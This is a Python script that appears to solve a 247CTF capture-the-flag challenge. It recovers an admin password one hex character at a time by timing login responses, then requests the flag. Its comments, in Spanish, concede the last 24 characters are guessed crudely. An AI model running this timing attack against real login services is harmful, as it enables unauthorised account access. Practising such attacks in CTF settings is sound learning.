#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

while True:
    api_token = get_token()
    known = ""
    
    # 128 requests, 16 chars, hacer 1 medición por char = 8 posiciones
    for pos in range(8):
        timings = {}
        
        for char in HEX_CHARS:
            test_pw = known + char + "0" * (31 - len(known))
            result, elapsed = try_login(test_pw, api_token)
            timings[char] = elapsed
            
            if result.get("result") == "success":
                flag_result = get_flag(test_pw)
                print(flag_result.get("flag", flag_result))
                exit(0)
        
        best_char = max(timings.items(), key=lambda x: x[1])[0]
        known += best_char
    
    # Ahora tengo 8 caracteres. Intentar brute force de los restantes 24
    # Eso es 16^24 = imposible
    
    # Probar con los 8 conocidos + diferentes combinaciones comunes
    common_suffixes = [
        "0" * 24,
        "f" * 24,
        "a" * 24,
    ]
    
    for suffix in common_suffixes:
        test_pw = known + suffix
        flag_result = get_flag(test_pw)
        if "flag" in str(flag_result).lower():
            print(flag_result.get("flag", flag_result))
            exit(0)
